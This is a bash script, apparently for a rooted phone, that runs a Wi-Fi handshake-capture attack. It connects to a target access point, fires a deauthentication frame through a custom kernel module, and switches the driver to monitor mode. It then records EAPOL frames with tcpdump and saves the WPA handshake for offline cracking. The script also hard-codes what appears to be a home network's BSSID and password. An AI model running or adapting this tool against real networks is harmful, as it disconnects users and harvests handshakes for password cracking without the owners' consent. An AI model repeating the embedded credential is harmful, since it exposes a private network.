#!/bin/bash
# fast_grab.sh - Ultra-optimized handshake grab with minimal switch time
# Runs on PHONE. Fires 1 deauth + immediate switch (no sleep between rmmod/insmod)
# Args: BSSID SSID FREQ ROUNDS CAPTURE_SEC
set -o pipefail

BSSID="$1"
SSID="$2"
FREQ="$3"
ROUNDS="${4:-15}"
CAPTURE_SEC="${5:-15}"
DRIVER="/tmp/qca_cld3_wlan.ko"
HOME_BSSID="8C:DE:F9:B3:9E:1F"
HOME_PSK="9006609b29404a"

echo "============================================"
echo " Fast Grab: $SSID ($BSSID) ${FREQ}MHz"
echo " Rounds: $ROUNDS  Capture: ${CAPTURE_SEC}s"
echo "============================================"

wait_wlan0() {
    for i in $(seq 1 200); do
        [ -e /sys/class/net/wlan0 ] && return 0
        sleep 0.01
    done
    return 1
}

cleanup() {
    echo "[*] Cleaning up..."
    killall wpa_supplicant tcpdump 2>/dev/null
    rmmod wlan 2>/dev/null; sleep 2
    insmod "$DRIVER" 2>/dev/null
    wait_wlan0 && sleep 3
    systemctl start NetworkManager 2>/dev/null; sleep 2
    nmcli device wifi connect "$HOME_BSSID" password "$HOME_PSK" ifname wlan0 2>/dev/null
    echo "[*] WiFi restored."
}
trap cleanup EXIT

BSSID_LOWER=$(echo "$BSSID" | tr 'A-F' 'a-f')

cat > /tmp/wpa_fast.conf << WPAEOF
ctrl_interface=/tmp/wpa_ctrl
network={
    ssid="$SSID"
    bssid=$BSSID
    psk="dummypassword1234567890123456"
    key_mgmt=WPA-PSK
    scan_freq=$FREQ
}
WPAEOF

rm -f /tmp/fast_*.pcap
systemctl stop NetworkManager 2>/dev/null
HANDSHAKE_FOUND=0

for round in $(seq 1 "$ROUNDS"); do
    echo -n "R$round: "

    # Load STA
    killall wpa_supplicant tcpdump 2>/dev/null; sleep 0.1
    rmmod wlan 2>/dev/null; sleep 0.5
    insmod "$DRIVER"
    wait_wlan0 || { echo "no wlan0"; continue; }
    sleep 1.5
    ip link set wlan0 up; sleep 0.3

    # Connect
    rm -rf /tmp/wpa_ctrl; mkdir -p /tmp/wpa_ctrl
    dmesg -C
    wpa_supplicant -i wlan0 -c /tmp/wpa_fast.conf -B -D nl80211 2>/dev/null

    # Wait for PE session
    PE=0
    for w in $(seq 1 150); do
        if dmesg | tail -30 | grep -q "Connecting to"; then
            PE=1; break
        fi
        sleep 0.02
    done
    [ "$PE" -eq 0 ] && { echo "no PE"; killall wpa_supplicant 2>/dev/null; continue; }

    # Wait for TX power (max 5s)
    for tp in $(seq 1 50); do
        TXPWR=$(iw dev wlan0 info 2>/dev/null | grep txpower | awk '{print $2}')
        [ -n "$TXPWR" ] && [ "$TXPWR" != "0.00" ] && break
        sleep 0.1
    done
    [ "$TXPWR" = "0.00" ] && { echo "no txpwr"; killall wpa_supplicant 2>/dev/null; continue; }

    # Fire 1 deauth (save time)
    dmesg -C
    insmod /tmp/petx11.ko 2>/dev/null
    DEAUTH=0
    dmesg | grep -q "Deauth TX" && DEAUTH=1
    [ "$DEAUTH" -eq 0 ] && { echo "no deauth"; killall wpa_supplicant 2>/dev/null; continue; }

    # IMMEDIATE fast switch - no sleep between rmmod and insmod!
    killall wpa_supplicant 2>/dev/null
    T0=$(date +%s%N)
    rmmod wlan
    insmod "$DRIVER" con_mode_monitor=4
    if ! wait_wlan0; then
        sleep 0.5
        rmmod wlan 2>/dev/null; sleep 0.3
        insmod "$DRIVER" con_mode_monitor=4
        wait_wlan0 || { echo "mon fail"; continue; }
    fi
    ip link set wlan0 up
    iw dev wlan0 set freq "$FREQ"
    T1=$(date +%s%N)
    SW=$(( (T1-T0)/1000000 ))
    echo -n "sw=${SW}ms "

    # Capture
    PCAP="/tmp/fast_${round}.pcap"
    timeout "$CAPTURE_SEC" tcpdump -i wlan0 -w "$PCAP" 2>/dev/null &
    TCPID=$!
    wait $TCPID 2>/dev/null

    FSIZE=$(stat -c%s "$PCAP" 2>/dev/null || echo 0)
    EAPOL=0
    [ "$FSIZE" -gt 24 ] && {
        EAPOL=$(tcpdump -r "$PCAP" -nn 2>/dev/null | grep -ic "EAPOL\|802.1X" || true)
        EAPOL=$(echo "$EAPOL" | tr -d '[:space:]')
        [ -z "$EAPOL" ] && EAPOL=0
    }

    echo "${FSIZE}B EAPOL=$EAPOL"

    if [ "$EAPOL" -gt 0 ]; then
        echo "[!!!] EAPOL DETECTED!"
        cp "$PCAP" "/tmp/handshake_fast_${BSSID_LOWER//:/}.pcap"
        HANDSHAKE_FOUND=1
        break
    fi
done

echo ""
if [ "$HANDSHAKE_FOUND" -eq 1 ]; then
    echo "SUCCESS: /tmp/handshake_fast_${BSSID_LOWER//:/}.pcap"
else
    echo "No handshake in $ROUNDS rounds"
fi
exit $((1 - HANDSHAKE_FOUND))
